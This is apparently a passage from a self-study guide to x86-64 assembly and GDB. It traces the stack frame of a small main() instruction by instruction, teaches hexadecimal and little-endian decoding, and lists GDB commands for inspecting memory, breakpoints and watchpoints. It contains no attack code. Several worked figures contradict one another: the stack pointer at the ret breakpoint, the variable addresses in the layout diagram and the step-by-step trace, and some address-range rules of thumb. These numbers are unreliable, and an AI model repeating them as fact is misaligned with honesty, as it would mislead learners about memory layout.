  0xca = 1100 1010 = 202 decimal = lowest address byte of return addr
  0xa1 = 1010 0001 = 161 decimal
  0xc2 = 1100 0010 = 194 decimal
  0xf7 = 1111 0111 = 247 decimal  ← libc identifier byte
  0xff = 1111 1111 = 255 decimal
  0x7f = 0111 1111 = 127 decimal  ← user space identifier
  0x00 = 0000 0000 = 0 decimal
  0x00 = 0000 0000 = 0 decimal    ← most significant bytes always 0
```

---

## PRACTICE — Memory Examination

```gdb
# Use your compiled binary
gdb -q stack

break *0x401134   # At ret instruction
run

# ─── Task 1: View stack 4 different ways ───
x/8gx $rsp        # As 8-byte quadwords
x/16wx $rsp       # As 4-byte words
x/32hx $rsp       # As 2-byte halfwords
x/64xb $rsp       # As individual bytes

# ─── Task 2: Find return address ───
x/1ga $rsp        # This shows return address with symbol
x/i *(void**)$rsp # Disassemble the instruction at return address

# ─── Task 3: Follow pointer chain ───
# argv is a pointer to an array of pointers to strings
print/x $rsi          # argv address
x/gx $rsi             # Content: pointer to first arg string
x/gx *(long*)$rsi     # Follow one level
x/s *(char**)$rsi     # View as string (program path)

# ─── Task 4: Compare byte/word/giant views ───
# All three should show same data, just formatted differently
x/1gx $rsp       # 0x00007ffff7c2a1ca
x/2wx $rsp       # 0xf7c2a1ca 0x00007fff  (split into two 32-bit)
x/8xb $rsp       # ca a1 c2 f7 ff 7f 00 00  (8 individual bytes)

# ─── Task 5: Find your variables ───
# After prologue, find var1, var2, ptr
x/dw $rbp-0x10   # var1 = 10
x/dw $rbp-0xc    # var2 = 300
x/gx $rbp-0x8    # ptr = address of string
x/s *(char**)($rbp-0x8)   # Dereference ptr to see string
```

---

# PART 4 ─ STACK FRAME ANATOMY: ULTRA-DEEP THEORY

## THEORY: EXACT MEMORY LAYOUT

### Complete Stack Frame from YOUR Session

**Your disassembly:**
```nasm
0x0000000000401106 <main+0>:   endbr64
0x000000000040110a <main+4>:   push   rbp
0x000000000040110b <main+5>:   mov    rbp,rsp
0x000000000040110e <main+8>:   mov    DWORD PTR [rbp-0x14],edi     ← argc
0x0000000000401111 <main+11>:  mov    QWORD PTR [rbp-0x20],rsi     ← argv
0x0000000000401115 <main+15>:  mov    DWORD PTR [rbp-0x10],0xa     ← var1=10
0x000000000040111c <main+22>:  mov    DWORD PTR [rbp-0xc],0x12c    ← var2=300
0x0000000000401123 <main+29>:  lea    rax,[rip+0xeda]               ← ptr address
0x000000000040112a <main+36>:  mov    QWORD PTR [rbp-0x8],rax      ← ptr stored
0x000000000040112e <main+40>:  mov    eax,0x0                       ← return 0
0x0000000000401133 <main+45>:  pop    rbp                           ← restore frame
0x0000000000401134 <main+46>:  ret                                  ← return to libc
```

**Complete Memory Layout at Breakpoint:**

```
        ╔═══════════════════════════════════════════════════════════╗
        ║ COMPLETE STACK FRAME OF main() AT BREAKPOINT             ║
        ╠═══════════════════════════════════════════════════════════╣
        ║                                                           ║
        ║  [CALLER'S FRAME - __libc_start_call_main]               ║
        ║                                                           ║
Addr:   ║  0x7fffffffe3b8  ← argv[0] pointer (program name)        ║
        ║  0x7fffffffe3c8  ← envp[0] pointer (first env var)       ║
        ║  ...                                                       ║
        ╠═══════════════════════════════════════════════════════════╣
        ║                                                           ║
        ║  [MAIN'S FRAME]                                           ║
        ║                                                           ║
        ║  RBP+0x10: 0x7fffffffe330+0x10 → caller's frame data     ║
        ║  RBP+0x08: 0x7fffffffe338 ← RETURN ADDRESS               ║
        ║             = 0x00007ffff7c2a1ca (<__libc_start_call+122>)║
        ║  RBP+0x00: 0x7fffffffe330 ← SAVED RBP ← RBP POINTS HERE ║
        ║             = 0x7fffffffe390 (caller's RBP value)         ║
        ║  RBP-0x08: 0x7fffffffe328 ← ptr (8 bytes, pointer)       ║
        ║             = 0x0000000000402004 (address of "Hello")     ║
        ║  RBP-0x0c: 0x7fffffffe324 ← var2 (4 bytes, int)          ║
        ║             = 0x0000012c (300 in hex)                     ║
        ║  RBP-0x10: 0x7fffffffe320 ← var1 (4 bytes, int)          ║
        ║             = 0x0000000a (10 in hex)                      ║
        ║  RBP-0x14: 0x7fffffffe31c ← argc (4 bytes, saved int)    ║
        ║             = 0x00000001 (1 = one argument)               ║
        ║  [4 bytes padding/alignment]                              ║
        ║  RBP-0x20: 0x7fffffffe310 ← argv (8 bytes, pointer)      ║
        ║             = 0x00007fffffffe3b8 (address of argv array)  ║
        ║                                                           ║
        ║  RSP → 0x7fffffffe298 ← STACK TOP AT BREAKPOINT          ║
        ║                                                           ║
        ╚═══════════════════════════════════════════════════════════╝
```

### Prologue — Step by Step with Register Changes

```
INSTRUCTION 1: endbr64
─────────────────────────────────────────────────────────
Before:  RIP=0x401106  RBP=0x7fffffffe390  RSP=0x7fffffffe328
After:   RIP=0x40110a  RBP=0x7fffffffe390  RSP=0x7fffffffe328
Changed: RIP only
Effect:  CPU checks that we arrived at a valid ENDBR target.
         Used by Intel CET to prevent ROP attacks.
         No data modification, just a check/marker.

INSTRUCTION 2: push rbp  (0x40110a)
─────────────────────────────────────────────────────────
Before:  RBP=0x7fffffffe390  RSP=0x7fffffffe328
         [RSP] = return address (old value)

OPERATION:
  Step A: RSP = RSP - 8 = 0x7fffffffe328 - 8 = 0x7fffffffe320
  Step B: [RSP] = RBP → writes 0x7fffffffe390 to 0x7fffffffe320

After:   RBP=0x7fffffffe390  RSP=0x7fffffffe320
         [RSP] = 0x7fffffffe390  ← saved RBP value

Memory change:
  0x7fffffffe320: ?? → 0x7fffffffe390  (caller's RBP saved here)
  RSP: 0x7fffffffe328 → 0x7fffffffe320 (moved 8 bytes down)

INSTRUCTION 3: mov rbp, rsp  (0x40110b)
─────────────────────────────────────────────────────────
Before:  RBP=0x7fffffffe390  RSP=0x7fffffffe320

OPERATION:
  RBP = RSP = 0x7fffffffe320

After:   RBP=0x7fffffffe320  RSP=0x7fffffffe320
         RBP == RSP (both point to saved RBP value)

Memory change: NONE (only RBP register changes)

Now RBP is set. This is main's frame base.
ALL local variable references use this RBP value!
RBP stays at 0x7fffffffe320 until the epilogue.

INSTRUCTION 4: mov DWORD PTR [rbp-0x14], edi  (0x40110e)
─────────────────────────────────────────────────────────
Before:  RBP=0x7fffffffe320  EDI=0x1 (argc=1)
         Target address: RBP-0x14 = 0x7fffffffe320-0x14 = 0x7fffffffe30c

OPERATION:
  [0x7fffffffe30c] = EDI = 0x00000001
  Writes 4 bytes (DWORD) at RBP-0x14

After: Memory at 0x7fffffffe30c: 01 00 00 00  (little-endian 1)

Why save argc? Because EDI might be overwritten by other function calls.
Saving to stack ensures argc survives even if EDI is reused.

INSTRUCTION 5: mov QWORD PTR [rbp-0x20], rsi  (0x401111)
─────────────────────────────────────────────────────────
Before:  RBP=0x7fffffffe320  RSI=0x7fffffffe3b8 (argv pointer)
         Target: RBP-0x20 = 0x7fffffffe300

OPERATION:
  [0x7fffffffe300] = RSI = 0x00007fffffffe3b8
  Writes 8 bytes (QWORD) at RBP-0x20

After: Memory at 0x7fffffffe300: b8 e3 ff ff ff 7f 00 00 (little-endian)

INSTRUCTION 6: mov DWORD PTR [rbp-0x10], 0xa  (0x401115)
─────────────────────────────────────────────────────────
This is: int var1 = 10;  (10 = 0xa in hex)
Target: RBP-0x10 = 0x7fffffffe310

OPERATION: [0x7fffffffe310] = 0x0000000a

After: Memory at 0x7fffffffe310: 0a 00 00 00

INSTRUCTION 7: mov DWORD PTR [rbp-0xc], 0x12c  (0x40111c)
─────────────────────────────────────────────────────────
This is: int var2 = 300;  (300 = 0x12c in hex)
Target: RBP-0xc = 0x7fffffffe314

OPERATION: [0x7fffffffe314] = 0x0000012c

After: Memory at 0x7fffffffe314: 2c 01 00 00  (little-endian 0x12c)

INSTRUCTION 8: lea rax, [rip+0xeda]  (0x401123)
─────────────────────────────────────────────────────────
lea = Load Effective Address (doesn't READ memory, just calculates address)

RIP at this instruction = 0x401123
Instruction length = 7 bytes
Next RIP = 0x401123 + 7 = 0x40112a

Target address = Next RIP + 0xeda = 0x40112a + 0xeda = 0x402004

This is where the string "Hello World" is stored in .rodata section

OPERATION: RAX = 0x402004

RAX does NOT change RSP or memory. Just loads an address.

INSTRUCTION 9: mov QWORD PTR [rbp-0x8], rax  (0x40112a)
─────────────────────────────────────────────────────────
This is: char *ptr = "Hello World";
Target: RBP-0x8 = 0x7fffffffe318

OPERATION: [0x7fffffffe318] = RAX = 0x0000000000402004

After: Memory at 0x7fffffffe318: 04 20 40 00 00 00 00 00

INSTRUCTION 10: mov eax, 0x0  (0x40112e)
─────────────────────────────────────────────────────────
This is: return 0;

OPERATION: EAX = 0  (also clears upper 32 bits of RAX)

RAX is the return value register.
Setting to 0 means main returns 0.

INSTRUCTION 11: pop rbp  (0x401133)
─────────────────────────────────────────────────────────
This DESTROYS main's stack frame.

Before:  RBP=0x7fffffffe320  RSP=0x7fffffffe320 (or near it)
         [RSP] = 0x7fffffffe390 (saved RBP from instruction 2)

OPERATION:
  Step A: RBP = [RSP] = 0x7fffffffe390  (restore caller's RBP)
  Step B: RSP = RSP + 8  (move stack pointer back up)

After:   RBP=0x7fffffffe390 (caller's frame restored)
         RSP=0x7fffffffe328

INSTRUCTION 12: ret  (0x401134)  ← YOUR BREAKPOINT
─────────────────────────────────────────────────────────
This returns to __libc_start_call_main.

Before:  RSP=0x7fffffffe298  (points to return address)
         [RSP] = 0x00007ffff7c2a1ca (return address)

OPERATION:
  Step A: RIP = [RSP] = 0x00007ffff7c2a1ca
  Step B: RSP = RSP + 8

After:   RIP=0x7ffff7c2a1ca (now executing in libc!)
         RSP=0x7fffffffe2a0
         Program continues in __libc_start_call_main
```

---

## GDB COMMANDS — Stack Frame Analysis

```gdb
# ─── Frame information ───
info frame                         # Detailed frame info
info frame 0                       # Current frame (#0)
info frame 1                       # Caller's frame (#1)
info locals                        # All local variables
info args                          # Function arguments
info symbol $rip                   # Symbol at current RIP
info symbol 0x401106               # Symbol at address

# ─── Backtrace ───
backtrace                          # Short backtrace
backtrace full                     # With local variables
backtrace 5                        # Only 5 levels
bt                                 # Abbreviation
where                              # Same as backtrace

# ─── Frame navigation ───
frame 0                            # Select frame 0 (innermost)
frame 1                            # Select frame 1 (caller)
up                                 # Move to caller frame
down                               # Move to callee frame
select-frame 2                     # Select frame 2

# ─── Disassembly ───
disassemble                        # Disassemble current function
disassemble main                   # Disassemble main
disassemble /r main                # With raw bytes
disassemble /m main                # With source lines mixed
disassemble 0x401106, 0x401134     # Range disassembly
disassemble $rip                   # Around current instruction

# ─── Step execution (CRITICAL) ───
stepi                              # Step one instruction (into calls)
si                                 # Abbreviation for stepi
nexti                              # Step one instruction (over calls)
ni                                 # Abbreviation for nexti
step                               # Step one source line (into calls)
next                               # Step one source line (over calls)
finish                             # Run until function returns
return                             # Return from function now
return 42                          # Return with value 42

# ─── Disassemble and step ───
x/5i $rip                          # See next 5 instructions
stepi                              # Execute one
x/5i $rip                          # See next 5 (updated)

# ─── Monitor prologue ───
# Set up automatic display then step through prologue
display/i $rip                     # Always show current instruction
display/x $rbp                     # Always show RBP
display/x $rsp                     # Always show RSP
display $rbp-$rsp                  # Always show frame size

break main
run
stepi                              # endbr64
stepi                              # push rbp
stepi                              # mov rbp,rsp
# Watch all displays update!
```

## OUTPUT ANALYSIS — disassemble main

```gdb
(gdb) disassemble main
```

**Actual Output from YOUR Session:**
```
Dump of assembler code for function main:
   0x0000000000401106 <+0>:     endbr64
   0x000000000040110a <+4>:     push   rbp
   0x000000000040110b <+5>:     mov    rbp,rsp
   0x000000000040110e <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000401111 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x0000000000401115 <+15>:    mov    DWORD PTR [rbp-0x10],0xa
   0x000000000040111c <+22>:    mov    DWORD PTR [rbp-0xc],0x12c
   0x0000000000401123 <+29>:    lea    rax,[rip+0xeda]        # 0x402004
   0x000000000040112a <+36>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040112e <+40>:    mov    eax,0x0
   0x0000000000401133 <+45>:    pop    rbp
   0x0000000000401134 <+46>:    ret
End of assembler code.
```

**EVERY PART EXPLAINED:**

```
Header: "Dump of assembler code for function main:"
         This is GDB telling you what function you're looking at.

Format: 0x0000000000401106 <+0>:    endbr64
        │─────────────────│  │──│   │──────│
        │                 │  │  │   Instruction mnemonic
        │                 │  │  └── Offset within function
        │                 │  └───── Function offset indicator
        │                 └──────── Address in virtual memory
        └────────────────────────── Full 64-bit hex address

Address: 0x0000000000401106
  0x         = hexadecimal prefix
  0000000000 = upper 40 bits (10 hex digits, all zero here)
               Why zeros? This binary's code starts at 0x400000
               which means upper bits are zero (low virtual address)
  40         = 0x40 = the page group (0x400000 = your binary's base)
  1106       = 0x1106 = offset 4358 decimal within binary
               The _start function and some libc init code come first
               main starts at offset 0x1106 from binary base

<+0>: = offset FROM THE START OF main()
  + = positive offset from function start
  0 = zero bytes from start (this IS the start)
  
<+4>: = 4 bytes from start
  Means: 0x401106 + 4 = 0x40110a (confirmed by address shown)

endbr64:
  end  = End (Landing pad for forward edges)
  br   = branch
  64   = 64-bit mode
  This is Intel CET (Control-flow Enforcement Technology)
  CPU verifies this instruction exists at branch target
  No data modification, just a security check

push rbp:
  push = decrement RSP by 8, store value
  rbp  = the register being pushed
  Effect: RSP -= 8; [RSP] = RBP

mov DWORD PTR [rbp-0x14], edi:
  mov        = move (copy)
  DWORD PTR  = Double Word Pointer = 4 bytes will be written
  [rbp-0x14] = Memory address: RBP minus 20 (decimal)
               0x14 hex = 20 decimal
  edi        = Source: lower 32 bits of RDI (contains argc)
  Full: Write 4 bytes from EDI to memory at (RBP - 20)

mov QWORD PTR [rbp-0x20], rsi:
  QWORD PTR  = Quad Word = 8 bytes
  [rbp-0x20] = RBP minus 32 (0x20 = 32 decimal)
  rsi        = Full 64-bit RSI register (contains argv pointer)
  Full: Write 8 bytes from RSI to memory at (RBP - 32)

mov DWORD PTR [rbp-0x10], 0xa:
  [rbp-0x10] = RBP minus 16 (0x10 = 16 decimal)
  0xa        = Immediate value 10 (0xa = 10 decimal)
  This is: int var1 = 10;

mov DWORD PTR [rbp-0xc], 0x12c:
  [rbp-0xc]  = RBP minus 12 (0xc = 12 decimal)
  0x12c      = Immediate value 300 (0x12c = 256+44 = 300 decimal)
  This is: int var2 = 300;
  
  Verify: 0x12c = 1*256 + 2*16 + 12 = 256 + 32 + 12 = 300 ✓

lea rax, [rip+0xeda]    # 0x402004:
  lea        = Load Effective Address (calculates, doesn't read)
  rax        = Destination register
  [rip+0xeda]= Address calculation: RIP + 0xeda
  # 0x402004 = GDB's computed result of the address calculation
  
  At 0x401123: RIP would be 0x40112a (NEXT instruction, not current!)
  0x40112a + 0xeda = 0x402004 ← where "Hello World" string lives

pop rbp:
  pop = read value from [RSP], then RSP += 8
  rbp = destination register
  Effect: RBP = [RSP]; RSP += 8
  Restores caller's RBP (what was pushed in prologue)

ret:
  ret = return from function
  Effect: RIP = [RSP]; RSP += 8
  Jumps to the return address that was on the stack
```

---

## PRACTICE — Full Stack Frame Analysis

```gdb
gdb -q stack
break *0x401134      # At ret instruction
run

# ─── Task 1: Complete memory dump ───
printf "\n=== COMPLETE MAIN() STACK FRAME ===\n"
printf "RBP = 0x%lx\n", $rbp
printf "RSP = 0x%lx\n", $rsp
printf "Frame size = %d bytes\n", ($rbp - $rsp)

# ─── Task 2: Show all variables ───
printf "\n=== VARIABLES (via RBP offsets) ===\n"
printf "ptr  (RBP-0x08): 0x%lx\n",   *(unsigned long*)($rbp-0x8)
printf "var2 (RBP-0x0c): %d\n",       *(int*)($rbp-0xc)
printf "var1 (RBP-0x10): %d\n",       *(int*)($rbp-0x10)
printf "argc (RBP-0x14): %d\n",       *(int*)($rbp-0x14)
printf "argv (RBP-0x20): 0x%lx\n",   *(unsigned long*)($rbp-0x20)

# ─── Task 3: Show frame structure ───
printf "\n=== FRAME STRUCTURE ===\n"
printf "Return Addr (RBP+8): 0x%lx\n",  *(unsigned long*)($rbp+8)
printf "Saved RBP   (RBP+0): 0x%lx\n",  *(unsigned long*)($rbp)

# ─── Task 4: Decode the string pointer ───
set $ptr_addr = *(unsigned long*)($rbp-0x8)
printf "\nptr points to: 0x%lx\n", $ptr_addr
x/s $ptr_addr    # Show the actual string!

# ─── Task 5: Step through ret and observe ───
printf "\n=== BEFORE ret ===\n"
printf "RSP: 0x%lx → points to: 0x%lx\n", $rsp, *(unsigned long*)$rsp
printf "RIP will become: 0x%lx\n", *(unsigned long*)$rsp
stepi    # Execute ret
printf "\n=== AFTER ret ===\n"
printf "RIP is now: 0x%lx\n", $rip
printf "RSP moved to: 0x%lx\n", $rsp
x/i $rip   # What instruction is now at RIP?
```

---

# PART 5 ─ HEXADECIMAL COMPLETE GUIDE

## THEORY: HEX SYSTEM FULLY EXPLAINED

### Binary → Hex Conversion (Memorize This Table)

```
Binary   Hex   Decimal   Meaning
───────────────────────────────────────────────────────────
0000      0      0       All bits zero
0001      1      1
0010      2      2
0011      3      3
0100      4      4
0101      5      5
0110      6      6
0111      7      7       All bits below bit-3 set
1000      8      8       Bit 3 set, others zero
1001      9      9
1010      A     10
1011      B     11
1100      C     12
1101      D     13
1110      E     14
1111      F     15       All bits set
```

### What Every Hex Prefix Tells You

```
Address Prefix    Meaning                    Example
─────────────────────────────────────────────────────────────────
0x00000000...     Very low memory (null area) 0x0000000000000000
0x0040...         Your binary's code section  0x0000000000401106
0x0060...         Your binary's data section  0x0000000000602000
0x7f7f...         Shared library (libc etc)   0x00007ffff7c2a1ca
0x7fff...         Stack memory                0x00007fffffffe330
0xffff...         Kernel space (inaccessible) 0xffff800000000000

Quick rule:
- Starts with 0x7fff → STACK
- Starts with 0x0040 → YOUR BINARY (code)
- Starts with 0x7ffff7 → LIBC/SHARED LIBRARIES
- Starts with 0x0000 0x5555 → HEAP
- All zeros/near-zero → NULL or uninitialized
```

### Hex Arithmetic You Need

```
Converting 0x12c to decimal (var2 = 300):
  1 × 16² = 1 × 256 = 256
  2 × 16¹ = 2 × 16  = 32
  c × 16⁰ = 12 × 1  = 12
  Total: 256 + 32 + 12 = 300 ✓

Converting 0xeda to decimal (RIP offset in lea instruction):
  e × 16² = 14 × 256 = 3584
  d × 16¹ = 13 × 16  = 208
  a × 16⁰ = 10 × 1   = 10
  Total: 3584 + 208 + 10 = 3802

Common Hex Values:
  0x00 = 0    (null byte - terminates strings!)
  0x0a = 10   (var1 value, also newline character)
  0x41 = 65   ('A' in ASCII)
  0x61 = 97   ('a' in ASCII)
  0x7f = 127  (DEL character, also max positive signed byte)
  0x80 = 128  (min negative signed byte in two's complement)
  0xff = 255  (max byte value, all bits set)
  0x100 = 256 (first value that doesn't fit in one byte)

Offset calculations:
  RBP - 0x08 = RBP - 8  (ptr: 8-byte pointer)
  RBP - 0x0c = RBP - 12 (var2: 4-byte int, 8 bytes after ptr? gap!)
  RBP - 0x10 = RBP - 16 (var1: 4-byte int)
  RBP - 0x14 = RBP - 20 (argc: 4-byte int)
  RBP - 0x20 = RBP - 32 (argv: 8-byte pointer)
  RBP + 0x00 = RBP      (saved RBP)
  RBP + 0x08 = RBP + 8  (return address)
```

### Reading Complex Hex Values

```
Value: 0x0000000000401106  (address of main)
       ││││││││ ││││││││
       ││││││││ │││││││└─ Bit 0-3:   0110 = 6
       ││││││││ ││││││└── Bit 4-7:   0000 = 0   → byte 0 = 0x06
       ││││││││ │││││└─── Bit 8-11:  0001 = 1
       ││││││││ ││││└──── Bit 12-15: 0001 = 1   → byte 1 = 0x11
       ││││││││ │││└───── Bit 16-19: 0000 = 0
       ││││││││ ││└────── Bit 20-23: 0100 = 4   → byte 2 = 0x40
       ││││││││ │└─────── Bit 24-27: 0000 = 0
       ││││││││ └──────── Bit 28-31: 0000 = 0   → byte 3 = 0x00
       ││││││└─────────── Bit 32-35: 0000 = 0
       │││││└──────────── Bit 36-39: 0000 = 0   → byte 4 = 0x00
       ││││└───────────── Bit 40-43: 0000 = 0
       │││└────────────── Bit 44-47: 0000 = 0   → byte 5 = 0x00
       ││└─────────────── Bit 48-51: 0000 = 0
       │└──────────────── Bit 52-55: 0000 = 0   → byte 6 = 0x00
       └───────────────── Bit 56-63: 0000 0000  → byte 7 = 0x00

Stored in memory at some address X:
  X+0: 0x06  (least significant byte first = little-endian!)
  X+1: 0x11
  X+2: 0x40
  X+3: 0x00
  X+4: 0x00
  X+5: 0x00
  X+6: 0x00
  X+7: 0x00
```

---

## GDB COMMANDS — Number Conversion

```gdb
# ─── Convert between number bases ───
print 0x12c              # Print 0x12c as decimal = 300
print/d 0x12c            # Explicitly as decimal
print/x 300              # Print 300 as hex = 0x12c
print/x 10               # Print 10 as hex = 0xa
print/t 0xff             # Print as binary = 11111111
print/t 255              # Print 255 as binary = 11111111
print/o 255              # Print as octal = 0377

# ─── Address calculations ───
print/x ($rbp - 0x10)   # Address of var1
print/x ($rbp - 0x14)   # Address of argc
print/x 0x40112a + 0xeda # Verify lea calculation = 0x402004

# ─── Size calculations ───
print sizeof(int)        # = 4
print sizeof(long)       # = 8
print sizeof(char *)     # = 8 (pointer size)

# ─── Memory content as different types ───
print *(int *)($rbp-0x10)         # var1 as signed int
print *(unsigned int *)($rbp-0x10)# var1 as unsigned
print *(long *)($rbp-0x8)         # ptr as long
print/x *(long *)($rbp-0x8)       # ptr as hex

# ─── ASCII ───
print/c 65               # Character 'A'
print/c 0x41             # Character 'A' (same)
printf "%c", 72          # Print character 'H'
printf "%d", 0xff        # Print 255

# ─── String examination ───
x/s 0x402004             # View string at address
x/4cb 0x402004           # First 4 chars with ASCII values
```

## OUTPUT ANALYSIS — Complete Hex Decoding Exercise

**From your session, the stack dump:**

```
[-----stack----]
0000| 0x7fffffffe298 → 0x7ffff7c2a1ca (<__libc_start_call_main+122>: mov edi,eax)
0008| 0x7fffffffe2a0 → 0x7fffffffe2e0 → 0x403e40 → 0x4010d0 (<__do_global_dtors_aux>: endbr64)
0016| 0x7fffffffe2a8 → 0x7fffffffe3b8 → 0x7fffffffe62a ("/home/vishal-yadav/Desktop/.../stack")
0024| 0x7fffffffe2b0 → 0x100400040
0032| 0x7fffffffe2b8 → 0x401106 (<main>: endbr64)
0040| 0x7fffffffe2c0 → 0x7fffffffe3b8 → 0x7fffffffe62a ("/home/vishal-yadav/Desktop/.../stack")
0048| 0x7fffffffe2c8 → 0x56d59bf55e5dada
0056| 0x7fffffffe2d0 → 0x1
```

**FULL DECODE:**

```
Line 1: 0000| 0x7fffffffe298 → 0x7ffff7c2a1ca
  0000  = offset from RSP (0 bytes = this IS RSP)
  0x7fffffffe298 = current RSP address
  0x7ffff7c2a1ca = value at RSP = THE RETURN ADDRESS
  → followed by: (<__libc_start_call_main+122>: mov edi,eax)
    This tells us:
    - Function: __libc_start_call_main (inside libc!)
    - Offset +122 bytes from function start
    - Instruction there: mov edi,eax
    Meaning: After main returns, libc will execute "mov edi,eax"
    which takes main's return value (EAX=0) and puts in EDI
    (preparing to call exit(0))

Line 2: 0008| 0x7fffffffe2a0 → 0x7fffffffe2e0 → 0x403e40 → 0x4010d0
  0008  = 8 bytes from RSP
  0x7fffffffe2a0 = address (RSP + 8)
  0x7fffffffe2e0 = value at that address (a stack address)
  → 0x403e40 = the value AT 0x7fffffffe2e0 (pointer chain!)
  → 0x4010d0 = value AT 0x403e40
  (<__do_global_dtors_aux>: endbr64) = this is a destructor function
  So we have a 3-level pointer chain:
  [RSP+8] → stack_address → binary_data_address → function_code

Line 3: 0016| 0x7fffffffe2a8 → 0x7fffffffe3b8 → 0x7fffffffe62a ("/home/...")
  0016  = 16 bytes from RSP (decimal 16 = hex 0x10)
  0x7fffffffe2a8 = address
  0x7fffffffe3b8 = value (argv pointer)
  → 0x7fffffffe62a = argv[0] = pointer to program name string
  "/home/vishal-yadav/Desktop/Assembly_Coding/stack" = actual string
  This is a 2-level pointer dereference (pointer-to-pointer-to-string)

Line 4: 0024| 0x7fffffffe2b0 → 0x100400040
  0024  = 24 bytes from RSP
  0x100400040 = packed value:
    Upper 32 bits: 0x00000001 = argc (value 1)
    Lower 32 bits: 0x00400040 = some binary address
    This appears to be packed data from __libc_start_main internals

Line 5: 0032| 0x7fffffffe2b8 → 0x401106 (<main>: endbr64)
  0032  = 32 bytes from RSP (0x20 = 32 decimal)
  0x401106 = address of main function!
  (<main>: endbr64) = that address contains endbr64 = start of main
  Why is main's address on the stack?
  __libc_start_main called main via: call rax (where rax=main)
  Or stored it as a pointer to pass around

Line 6: 0040| 0x7fffffffe2c0 → 0x7fffffffe3b8 → 0x7fffffffe62a
  argv appears again - libc keeps multiple copies of argv

Line 7: 0048| 0x7fffffffe2c8 → 0x56d59bf55e5dada
  0x056d59bf55e5dada = appears random
  This is either:
  a) Stack garbage (uninitialized memory from previous use)
  b) A stack cookie/canary value (but we compiled without -fstack-protector)
  c) Random initialization by __libc_start_main
  The pattern 0x0...da da at end looks like filler
  0x05 6d 59 bf 55 e5 da da - each pair is one byte

Line 8: 0056| 0x7fffffffe2d0 → 0x1
  The value 1 = argc (stored by __libc_start_main)
  0x1 = exactly 1 command-line argument (the program itself)
```

---

## PRACTICE — Hex Decoding

```gdb
gdb -q stack
break *0x401134
run

# ─── Task 1: Decode var1 and var2 ───
x/8xb $rbp-0x10   # Show var1 as 8 bytes
# Should show: 0a 00 00 00 __ __ __ __
# Decode: 0x0a 0x00 0x00 0x00 = little-endian 0x0000000a = 10

x/8xb $rbp-0xc    # Show var2 as 8 bytes
# Should show: 2c 01 00 00 __ __ __ __
# Decode: 0x2c 0x01 0x00 0x00 = little-endian 0x0000012c = 300

# Verify
print *(int *)($rbp-0x10)    # Should print 10
print *(int *)($rbp-0xc)     # Should print 300

# ─── Task 2: Decode the ptr variable ───
x/8xb $rbp-0x8
# Shows 8 bytes of the address stored as ptr
# Convert from little-endian to address
# e.g., 04 20 40 00 00 00 00 00 = 0x0000000000402004

x/gx $rbp-0x8
# Shows same value assembled as 64-bit
# Then dereference:
x/s *(char**)($rbp-0x8)
# Shows the actual string!

# ─── Task 3: Decode saved RBP and return address ───
x/8xb $rbp      # Saved RBP as bytes
x/gx $rbp       # Saved RBP as 64-bit
print/x *(unsigned long *)$rbp   # Should be old RBP value

x/8xb ($rbp+8)  # Return address as bytes
x/gx ($rbp+8)   # Return address as 64-bit
x/i *(void**)($rbp+8)  # Disassemble instruction at return address

# ─── Task 4: Verify little-endian with all variables ───
# Look at 64 bytes covering the entire frame
x/64xb ($rbp-0x30)
# Identify each variable's bytes manually
# var1=10, var2=300, ptr=0x402004 should be visible

# ─── Task 5: Convert values ───
print/x 10           # 10 → 0xa
print/x 300          # 300 → 0x12c
print/d 0xa          # 0xa → 10
print/d 0x12c        # 0x12c → 300
print/d 0xeda        # 0xeda → 3802 (offset in lea instruction)
print/x 0x40112a + 0xeda  # Calculate string address
# Should give 0x402004
```
# MASTER GUIDE — PART B
## GDB Mastery + Exploitation + Advanced Analysis

---

# PART 6 ─ EVERY GDB COMMAND CATEGORIZED

## CATEGORY 1: PROGRAM LOADING & LAUNCHING

```gdb
# ─── Load program ───
file stack                          # Load binary into GDB
file /full/path/to/stack            # Load with full path
exec-file stack                     # Alternative load command
symbol-file stack                   # Load only symbols (no exec)
add-symbol-file extra.so 0x7fff...  # Add symbols from shared lib

# ─── Set arguments ───
set args arg1 arg2 arg3             # Set command-line arguments
set args                            # Clear all arguments
show args                           # Show current arguments
run arg1 arg2                       # Run with arguments directly
run < input.txt                     # Run with stdin from file
run > output.txt                    # Run with stdout to file

# ─── Environment ───
set environment VAR=value           # Set environment variable
unset environment VAR               # Remove variable
show environment                    # Show all environment vars
set environment LD_PRELOAD=./lib.so # Preload shared library

# ─── Run control ───
run                                 # Start program
run arg1 arg2                       # Start with args
start                               # Start and break at main
start arg1                          # Start with arg, break at main
starti                              # Start and break at first instruction
attach PID                          # Attach to running process
detach                              # Detach from process

# ─── Multiple inferiors ───
info inferiors                      # List all program instances
inferior 2                          # Switch to instance 2
add-inferior                        # Add new inferior
```

## CATEGORY 2: BREAKPOINTS — COMPLETE GUIDE

```gdb
# ─── Simple breakpoints ───
break main                          # Break at function entry
break function_name                 # Break at any function
break filename.c:25                 # Break at line 25 of file
break *0x401134                     # Break at exact address
break *main+46                      # Break at offset from function
break                               # Break at current line
break +5                            # Break 5 lines ahead
break main if $argc > 1             # Conditional breakpoint

# ─── Breakpoint information ───
info breakpoints                    # List all breakpoints
info break                          # Same as above
info break 1                        # Info about breakpoint 1

# ─── Breakpoint control ───
disable 1                           # Disable breakpoint 1
enable 1                            # Enable breakpoint 1
disable                             # Disable all breakpoints
enable                              # Enable all breakpoints
delete 1                            # Delete breakpoint 1
delete                              # Delete all breakpoints
clear main                          # Clear breakpoint at main
clear *0x401134                     # Clear at address

# ─── Temporary breakpoints (auto-delete after hit) ───
tbreak main                         # Temporary breakpoint
tbreak *0x401134                    # Temporary at address

# ─── Hardware breakpoints (limited count, for ROM/memory-mapped) ───
hbreak main                         # Hardware breakpoint
thbreak main                        # Temporary hardware breakpoint

# ─── Breakpoint commands (execute GDB commands when hit) ───
break main
commands
    silent                          # Don't print "Breakpoint hit" message
    printf "Hit main! RSP=0x%lx\n", $rsp
    continue                        # Auto-continue after commands
end

# ─── Complex conditional breakpoints ───
break malloc if $rdi > 1000         # Break when malloc called with >1000
break *0x401115 if *(int *)($rbp-0x10) == 0   # Break when var1 equals 0
break *0x401134 if $rax != 0        # Break at ret if return value != 0

# ─── Watchpoints (break on memory access) ───
watch *((int *)($rbp-0x10))         # Break when var1 WRITTEN
rwatch *((int *)($rbp-0x10))        # Break when var1 READ
awatch *((int *)($rbp-0x10))        # Break on READ or WRITE

watch $rsp                          # Break when RSP changes (very useful!)
